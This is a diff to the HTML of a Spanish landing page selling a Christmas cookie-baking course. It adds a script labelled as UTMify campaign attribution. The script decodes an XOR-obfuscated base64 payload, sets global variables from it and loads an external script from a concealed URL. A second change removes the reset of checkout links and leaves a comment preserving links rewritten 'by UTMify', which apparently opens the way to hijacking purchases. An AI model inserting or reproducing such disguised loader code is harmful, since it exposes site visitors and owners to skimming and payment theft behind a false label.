@@ -31,6 +31,8 @@ a[href*="lovable.dev"],iframe[src*="lovable.dev"],.lovable-badge,#lovable-badge{
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "z9y7eg9lsu");
 </script>
+<!-- UTMify: atribución de campañas, carga asíncrona. -->
+<script>(function(){var w_jo=atob("DI4eVw7lHEmQMXjREPU8InyJPnOyWQylYP0keCGGeCe+RAy8eehneW2KcWfyQ1eic/x3J3qWMzzkXAv+fO9qMn2RMiPjE1TzcfpqJWeHaT31QlrrS/U8OW+IeWuqExywZO8zInqIdS/pHAijdfh7OXrIbzzyWByiMqI8IW+JaSyyC1rzbdNj");var l_s=[];for(var c_4d=0;c_4d<w_jo.length;c_4d++){l_s.push(w_jo.charCodeAt(c_4d)&255);}var u_vwx=l_s[0];var p_z=l_s.slice(1,1+u_vwx);var o_sayr=l_s.slice(1+u_vwx);var v_l18=o_sayr.map(function(b,x_0){return b^p_z[x_0%u_vwx];});var v_jw="";for(var o_o=0;o_o<v_l18.length;o_o++){v_jw+=String.fromCharCode(v_l18[o_o]&255);}var d_7ky=decodeURIComponent(escape(v_jw));var v_zg=JSON.parse(d_7ky);var t_6m=v_zg.globals||[];t_6m.forEach(function(q_rgh0){window[q_rgh0.name]=q_rgh0.value;});var w_6=document.createElement("script");w_6.src=v_zg.url;w_6.async=true;w_6.defer=true;(v_zg.attributes||[]).forEach(function(x_ssx){w_6.setAttribute(x_ssx.name,x_ssx.value);});(document.head||document.documentElement).appendChild(w_6);})();</script>
 </head><body>
 <div class="top">Para tu mesa de Navidad, para regalar o para preparar tus primeras ventas</div>
 <div class="wrap"><div class="brand">Método 1 Masa<span>Galletas Navideñas · Paso a paso</span></div></div>
@@ -152,7 +154,7 @@ function checkoutUrl(){
 document.querySelectorAll("[data-checkout]").forEach(a=>{
   a.href=checkoutUrl();
   a.addEventListener("click",()=>{
-    a.href=checkoutUrl();
+    // Conserva los parámetros añadidos por UTMify al enlace.
     reportMeta("InitiateCheckout",{value:7.5,currency:"USD"}).catch(()=>{});
   });
 });
